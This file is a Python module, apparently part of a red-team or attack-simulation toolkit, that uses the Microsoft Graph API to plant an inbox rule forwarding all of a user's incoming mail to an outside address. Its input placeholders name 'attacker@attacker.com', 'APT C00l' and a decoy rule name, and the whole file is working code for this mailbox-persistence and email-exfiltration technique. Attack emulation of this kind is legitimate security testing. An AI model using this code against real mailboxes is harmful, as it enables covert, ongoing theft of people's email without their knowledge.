'''
Module Name: Email_Forwarding_Rule
Module Description: Setup email forwarding rule on a users mailbox. Privileges: MailboxSettings.ReadWrite
'''
from core.GraphFunctions import graph_post_request

def TechniqueMain(rule_name, user_id, recipient_name, recipient_address):
    
    # input validation
    if rule_name in [None, ""]:
        return False, {"Error" : "Invalid Technique Input"}, None
    if user_id in [None, ""]:
        return False, {"Error" : "Invalid Technique Input"}, None
    if recipient_name in [None, ""]:
        return False, {"Error" : "Invalid Technique Input"}, None
    if recipient_address in [None, ""]:
        return False, {"Error" : "Invalid Technique Input"}, None
    
    endpoint_url = f"https://graph.microsoft.com/v1.0/users/{user_id}/mailFolders/inbox/messageRules"
    data = {
        "displayName": rule_name,
        "sequence": 3,
        "isEnabled": "true", 
        "conditions": {
            "sentToMe": "true"
        },
        "actions": {
            "forwardTo": [
                {
                    "emailAddress": {
                        "name": recipient_name,
                        "address": recipient_address
                    }
                }
            ],
            "stopProcessingRules": 'true'
        }
    }

    try:
        raw_response = graph_post_request(url = endpoint_url, data = data)

        # email forwarding rule setup successfull
        if 200 <= raw_response.status_code < 300:
            # parse raw response => pretty response
            try:
                # create pretty response
                pretty_response = {}

                pretty_response["Success"] = {
                    'Message' : "Email forwarding rule deployed on mailbox",
                    'Rule Name' : rule_name,
                    'Rule Id' : raw_response.json().get('id', 'N/A'),
                    'Enabled' : raw_response.json().get('isEnabled', 'N/A'),
                    'Conditions' : raw_response.json().get('conditions', 'N/A'),
                    'Actions' : raw_response.json().get('actions', 'N/A'),
                    'Sequence' : raw_response.json().get('sequence', 'N/A'),
                }
                return True, raw_response.json(), pretty_response
            except:
                # return only raw response if pretty response fails
                return True, raw_response.json(), None
        
        # email forwarding rule setup failed
        else:
            return False, {"Error" : {"Response Status" : raw_response.status_code, "Code" : raw_response.json().get('error').get('code', 'N/A'), "Message" : raw_response.json().get('error').get('message', 'N/A')}}, None
    
    except Exception as e:
        return False, {"Error" : e}, None


def TechniqueInputSrc() -> list:
    '''Returns the input fields required as parameters for the technique execution'''
    return [
        {"title" : "Rule Name", "id" : "mail-forwarding-config-rule-name-text-input", "type" : "text", "placeholder" : "Seriously-Legitimate-Forwarding-Rule", "element_type" : "dcc.Input"},
        {"title" : "Forwarding Mailbox Address", "id" : "mail-forwarding-config-mailbox-addr-text-input", "type" : "email", "placeholder" : "user@corp.com", "element_type" : "dcc.Input"},
        {"title" : "Recipient Name", "id" : "mail-forwarding-config-forward-addr-name-text-input", "type" : "text", "placeholder" : "APT C00l", "element_type" : "dcc.Input"},
        {"title" : "Recipient Mailbox Address", "id" : "mail-forwarding-config-forward-addr-text-input", "type" : "email", "placeholder" : "attacker@attacker.com", "element_type" : "dcc.Input"},
    ]